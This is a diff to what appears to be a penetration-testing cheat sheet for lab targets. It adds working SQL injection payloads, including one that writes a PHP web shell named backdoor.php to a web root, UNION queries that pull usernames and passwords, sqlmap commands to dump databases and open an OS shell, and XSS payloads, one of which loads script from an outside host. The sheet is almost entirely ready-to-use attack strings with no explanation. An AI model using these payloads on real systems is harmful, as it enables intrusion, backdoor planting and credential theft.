@@ -45,6 +45,7 @@ nc -nv 10.11.0.22 80
 ### SQL Injection
 
 ```
+mysql -u root -proot
 
 jim' or 1=1 limit 1;#
 
@@ -63,6 +64,37 @@ http://10.11.0.22/debug.php?id=1 union all select 1, 2, column_name from informa
 
 http://10.11.0.22/debug.php?id=1 union all select 1, username, password from users
 
+http://192.168.175.10/debug.php?id=1%20union%20all%20select%201,%202,%20%22%3C?php%20echo%20shell_exec($_GET[%27cmd%27]);?%3E%22%20into%20OUTFILE%20%27c:/xampp/htdocs/backdoor.php%27
 
+```
+#### sqlmap
 
+```
+sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id"
+
+sqlmap -u http://192.168.175.10/debug.php?id=1 -p "id" --dbms=mysql --dump
+
+sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --os- shell
+
+http://192.168.175.10:9090/search?search=gizmo%27)+UNION+ALL+SELECT+1,%27d%27,%27s%27,4,5--
+
+http://192.168.175.10:9090/search?search=gizmo%27)%20union%20select%20null,table_name,user(),4,null%20from%20information_schema.tables--
+
+http://192.168.175.10:9090/search?search=gizmo%27)%20union%20select%20null,column_name,user(),4,null%20from%20information_schema.columns%20--
+
+http://192.168.175.10:9090/search?search=gizmo%27)%20union%20select%20null,concat(username,password),user(),4,null%20from%20users%20--
+
+http://192.168.175.10:9090/search?search=gizmo%27)%20union%20select%20null,concat(username,password),user(),4,null%20from%20users%20--
+```
+
+### XSS
+
+```
+<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
+<svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+<svg/onload=alert('XSS')>
+<BODY ONLOAD=alert('XSS')>
+
+https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
 ```
